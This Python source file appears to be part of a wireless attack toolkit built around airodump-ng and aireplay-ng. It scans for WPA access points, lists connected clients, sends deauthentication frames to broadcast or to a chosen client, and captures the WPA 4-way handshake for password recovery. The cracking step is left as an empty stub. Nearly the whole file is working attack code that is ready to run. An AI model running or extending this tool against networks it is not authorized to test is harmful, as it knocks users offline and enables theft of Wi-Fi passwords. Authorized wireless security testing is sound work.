#!/usr/bin/env python3
import csv
from pathlib import Path as FPath
from secrets import token_hex
from typing import Any, Dict, List, Optional, Union

from prettytable import PrettyTable

from .core import (constants, install_packages,
                   term_colours, tk_elements, wireless_cards)


class aircrack(install_packages.PackageInstaller, wireless_cards.card_manager,
               term_colours.StandardColours, tk_elements.TkManager):

    def __init__(self, reset_colours=False, stop_nmgr=True) -> None:
        super().__init__()

        # Check if handshake directory exists.
        if not min(constants.HANDSHAKE_FILES.exists(), constants.TEMP_FILES.exists(), constants.CAP_FILES.exists()):
            constants.HANDSHAKE_FILES.mkdir(parents=True, exist_ok=True)
            constants.TEMP_FILES.mkdir(parents=True, exist_ok=True)
            constants.CAP_FILES.mkdir(parents=True, exist_ok=True)

        term_colours.Colours.reset_colours = reset_colours
        self.InputManager = tk_elements.InputManager
        self.stop_nmgr = stop_nmgr

    def scan_aps(self) -> Optional[Union[bool, int]]:
        self.clear()
        if self.stop_nmgr:
            self.nm_stop()
        self.green.print_success("Let's start by selecting a card, here's yours:\n")
        self.load_cards()
        card_table = PrettyTable()
        card_table.field_names = [self.red.return_colour("No."),
                                  self.green.return_colour("Interface"),
                                  self.yellow.return_colour("Driver"),
                                  self.blue.return_colour("Chipset")]

        for idx in self.total_cards:
            card_table.add_row([idx, *self.total_cards[idx]])
        print(card_table, end="\n\n")
        self.yellow.print_status("i", "Please enter preferred card number.\n")
        card_no = self.InputManager("modules/aircrack/select_card").get(max(self.total_cards.keys()))
        self.select_card(card_no)
        print()
        self.green.print_success("Now, let's scan for Access Points.")
        self.green.print_success("Once you see the target AP, press Ctrl-C once.")
        self.blue.print_status("i", "Proceed? y/n\n")
        exp_cfm = self.InputManager("modules/aircrack/explore_aps").get(boolean=True)

        if exp_cfm is None or not exp_cfm:
            return exp_cfm

        self.fpath = constants.TEMP_FILES / token_hex()
        cmd = (f"{constants.AIRODUMP_PATH} -a -w {self.fpath}"
               f" --output-format csv -I 2 -t WPA -t WPA2 -t WPA1 --ignore-negative-one {self.card_name}")
        self.set_mode(1)

        try:
            self.run(cmd)
            return True
        except(KeyboardInterrupt, EOFError):
            return True

    def select_target(self) -> None:
        self.clear()
        ap_table = PrettyTable()
        ap_table.field_names = list(self.red.return_colour("No.", "BSSID", "Channel", "Privacy",
                                                           "Cipher", "Auth", "PWR", "ESSID"))
        ap_map: Dict[str, List[str]] = {}
        num_map = {}
        ap_counter = 1
        n_counter = -1
        csv_dump = FPath(str(self.fpath) + '-01.csv')
        with open(str(csv_dump), "r") as ap_list:
            csv_reader = csv.reader(ap_list, delimiter=",", quotechar="|")
            for i in csv_reader:
                n_counter += 1
                if len(i) > 9 and n_counter > 1:
                    ap_map[i[0]] = [str(ap_counter) + " ", i[0].strip(),
                                    i[3].strip(), i[5].strip(),
                                    i[6].strip(), i[7].strip(),
                                    i[8].strip(), i[-2].strip()]
                    num_map[ap_counter] = i[0].strip()
                    ap_counter += 1

                elif 0 < len(i) < 9:
                    y_dot: str = self.yellow.return_colour("*")
                    this_ap: Optional[List[str]] = ap_map.get(i[-2].strip())

                    if this_ap is not None and y_dot not in this_ap[0]:
                        ap_map[this_ap[1]][0] = this_ap[0].strip() + y_dot

        for ap in ap_map.values():
            ap_table.add_row(ap)

        print(
            ap_table,
            end=f"\n\n{self.yellow.return_colour('*')} Indicates there are clients connected to that AP.\n\n"
        )
        csv_dump.unlink()
        ap_counter -= 1
        self.yellow.print_question("Please enter number of target AP.\n")
        self.target_ap: Any = ap_map.get(
            num_map.get(self.InputManager("modules/aircrack/select_ap").get(ap_counter), "")
        )

        if self.target_ap is None:
            ...

    def deauth_capture(self) -> None:
        self.clear()
        chosen = 0
        options = [
            "Send Deauth to broadcast address & capture handshake",
            "Send Deauth to specific client & capture handshake",
            "Don't send Deauths, listen passively for handshake"
        ]
        ap_table = PrettyTable()
        ap_table.field_names = list(self.yellow.return_colour("No.", "BSSID", "Channel", "Privacy",
                                                              "Cipher", "Auth", "PWR", "ESSID"))
        ap_table.add_row(self.target_ap)
        print(ap_table, end="\n\n")

        for i in enumerate(options, start=1):
            print(f"  [{self.deep_green.return_colour(i[0])}] - {i[1]}")
        print("\n")
        self.blue.print_status("i", "Please enter integer relating to required action.\n")
        chosen = self.InputManager("modules/aircrack/deauth_selection").get(i[0])
        print()

        if chosen is None:
            self.cleanup()
            return False

        self.green.print_success("Target AP selected, let's capture a handshake for PSK retrieval.")
        self.cap_path: FPath = constants.CAP_FILES / token_hex()

        if chosen == 1:
            self.yellow.print_status("!", "You've chosen to deauth broadcast, this will disconnect all clients\n")
            self.blue.print_status("i", "Please enter how many deauths you want to send to broadcast")
            self.yellow.print_unsure("Try a low amount so clients can reauth quickly, e.g. 5-20\n")
            deauth_count: int = self.InputManager("modules/aircrack/deauth_broadcast_count").get(500, False, False, 0)
            print()
            cmd: str = (f"{constants.AIREPLAY_PATH} -0 {deauth_count} -a {self.target_ap[1]} {self.card_name} && "
                        f"{constants.AIRODUMP_PATH} --output-format pcap -w {self.cap_path} -c {self.target_ap[2]} "
                        f"--bssid {self.target_ap[1]} --ignore-negative-one {self.card_name} "
                        " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 1 &&"  # noqa: W605
                        " pkill airodump-ng)")
            self.yellow.print_status(
                "i", "When you're ready, press enter, if a deauth isn't captured, press Ctrl-C & try again."
            )
            self.InputManager("modules/aircrack/confirm_capture").get(passthrough=True)

        elif chosen == 2:
            ext = ", the AP might not have clients" if self.yellow.return_colour("*") not in self.target_ap[0] else ""
            self.yellow.print_status("!", f"You've chosen to deauth a specific client{ext}")
            self.green.print_success("When you're ready, hit Enter. Press Ctrl-C when target client is seen\n")
            self.InputManager("modules/aircrack/enum_client").get(passthrough=True)
            client_list = constants.TEMP_FILES / token_hex()
            try:
                self.run(f"iwconfig {self.card_name} channel {self.target_ap[2]}")
                self.run(f"{constants.AIRODUMP_PATH} -w {client_list} --output-format csv -I 3"
                         f" -c {self.target_ap[2]} --bssid {self.target_ap[1]} --ignore-negative-one {self.card_name}")
            except(KeyboardInterrupt, EOFError):
                ...
            client_list = FPath(str(client_list) + "-01.csv")
            clients = PrettyTable()
            clients.field_names = list(self.yellow.return_colour("No.", "Client MAC", "Signal", "Packets", "AP MAC"))
            clients_counter: int = 1
            client_map = {}
            with open(str(client_list), "r") as client_csv:
                csv_reader: Any = csv.reader(client_csv, delimiter=",", quotechar="|")  # type: ignore
                for i in csv_reader:
                    curr_client = [str(q).strip() for q in i]
                    if 0 < len(i) < 9 and self.target_ap[1] in curr_client:  # type: ignore
                        c_client = [curr_client[0], curr_client[3], curr_client[4], curr_client[5]]  # type: ignore
                        client_map[clients_counter] = c_client
                        clients.add_row([str(clients_counter), *c_client])
                        clients_counter += 1
            clients_counter -= 1
            self.clear()
            print(clients, end="\n\n")
            client_list.unlink()

            if len(client_map) == 0:
                self.red.print_fail("No clients found connected to AP, please try again")
                return

            self.blue.print_status("i", "Please enter number of desired client to deauth\n")
            client_mac: Any = client_map.get(
                self.InputManager("modules/aircrack/choose_client").get(clients_counter), ""
            )[0]
            print()
            self.yellow.print_status(
                "i",
                f"Please enter how deauths you want to send this client ({self.yellow.return_colour(client_mac)})\n"
            )
            deauth_count = self.InputManager("modules/aircrack/deauth_client_count").get(500, False, False, 0)
            print()
            self.green.print_success(
                "When you're ready, hit enter. If a handshake isn't captured, press Ctrl-C and try again."
            )
            self.InputManager("modules/aircrack/start_capture").get(passthrough=True)
            cmd = (
                f"{constants.AIREPLAY_PATH} -0 {deauth_count} -a {self.target_ap[1]} -c {client_mac} {self.card_name}"
                f" && {constants.AIRODUMP_PATH} --output-format pcap -w {self.cap_path} -c {self.target_ap[2]} "
                f"--bssid {self.target_ap[1]} --ignore-negative-one {self.card_name} "
                " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 1 &&"  # noqa: W605
                " pkill airodump-ng)"
            )

        elif chosen == 3:
            self.yellow.print_status("!", "You've chosen not to send deauths, you'll need to wait for handshake\n")
            self.green.print_success(
                "When ready, hit enter. If a handshake isn't captured, press Ctrl-C and try again\n"
            )
            self.InputManager("modules/aircrack/start_capture").get(passthrough=True)
            cmd = (
                f"{constants.AIRODUMP_PATH} --output-format pcap -w {self.cap_path} -c {self.target_ap[2]} "
                f"--bssid {self.target_ap[1]} --ignore-negative-one {self.card_name} "
                " | tee /dev/tty > >(grep -i -m 1 ']\[ WPA handshake:' -q && sleep 1 &&"  # noqa: W605
                " pkill airodump-ng)"
            )

        self.cap_file: str = str(self.cap_path) + "-01.cap"

        try:
            self.run(f"iwconfig {self.card_name} channel {self.target_ap[2]}")
            self.run(f'/usr/bin/env bash -c "{cmd}"')
            self.green.print_success("Successfully captured 4-way handshake")

        except(KeyboardInterrupt, EOFError):
            self.reset_term()

    def recover_psk(self) -> None:
        ...

    def cleanup(self) -> None:
        self.set_mode(0) if self.card_name not in [None, ""] else ...
        if self.stop_nmgr:
            self.nm_start()
        self.reset_cards()
        self.green.print_success(f"Cleaned up {self.card_name}")


# from airscript import modules;
# a= modules.aircrack(stop_nmgr=False);a.scan_aps();a.select_target();a.deauth_capture();a.recover_psk();a.cleanup()
